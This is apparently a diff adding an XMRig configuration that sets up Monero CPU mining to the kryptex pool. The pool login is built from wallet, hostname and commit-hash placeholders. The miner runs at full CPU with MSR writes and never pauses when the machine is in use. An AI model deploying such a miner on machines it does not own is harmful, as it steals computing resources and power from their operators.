@@ -1,0 +1,43 @@
+{
+    "autosave": false,
+    "randomx": {
+        "init": -1,
+        "init-avx2": 1,
+        "mode": "fast",
+        "1gb-pages": true,
+        "numa": true
+    },
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "huge-pages-jit": false,
+        "priority": 5,
+        "max-threads-hint": 100,
+        "asm": "ryzen",
+        "yield": false,
+        "rdmsr": true,
+        "wrmsr": true,
+        "memory-pool": true
+    },
+    "opencl": false,
+    "cuda": false,
+    "donate-level": 0,
+    "log-file": null,
+    "syslog": true,
+    "pools": [
+        {
+            "algo": "rx/0",
+            "coin": "monero",
+            "url": "xmr.kryptex.network:8888",
+            "user": "$WALLET/$(hostname)-$THREADSthreads-$commitHash",
+            "keepalive": true,
+            "enabled": true,
+            "tls": true
+        }
+    ],
+    "pause-on-battery": false,
+    "pause-on-active": false,
+    "verbose": 2,
+    "print-time": 60
+}
+
